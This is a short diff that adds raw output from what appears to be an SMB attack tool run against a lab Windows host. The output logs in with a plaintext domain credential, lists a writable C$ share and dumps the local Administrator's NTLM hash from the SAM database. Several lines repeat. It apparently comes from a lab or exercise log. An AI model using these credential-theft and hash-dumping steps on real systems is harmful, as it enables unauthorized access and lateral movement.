@@ -1,0 +1,11 @@
+SMB         10.10.20.21     445    LABWS1           [*] Windows 10 / Server 2019 Build 19041 x64 (name:LABWS1) (domain:lab-01.local) (signing:True) (SMBv1:False)
+SMB         10.10.20.21     445    LABWS1           [+] lab-01.local\backup.ops:Backup2026! (Pwn3d!)
+SMB         10.10.20.21     445    LABWS1           [*] Enumerated shares
+SMB         10.10.20.21     445    LABWS1           Share           Permissions     Remark
+SMB         10.10.20.21     445    LABWS1           -----           -----------     ------
+SMB         10.10.20.21     445    LABWS1           C$              READ,WRITE      Default share
+SMB         10.10.20.21     445    LABWS1           [*] Windows 10 / Server 2019 Build 19041 x64 (name:LABWS1) (domain:lab-01.local) (signing:True) (SMBv1:False)
+SMB         10.10.20.21     445    LABWS1           [+] lab-01.local\backup.ops:Backup2026! (Pwn3d!)
+SMB         10.10.20.21     445    LABWS1           [*] Dumping SAM hashes
+SMB         10.10.20.21     445    LABWS1           Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+SMB         10.10.20.21     445    LABWS1           [+] Added 1 SAM hashes to the database
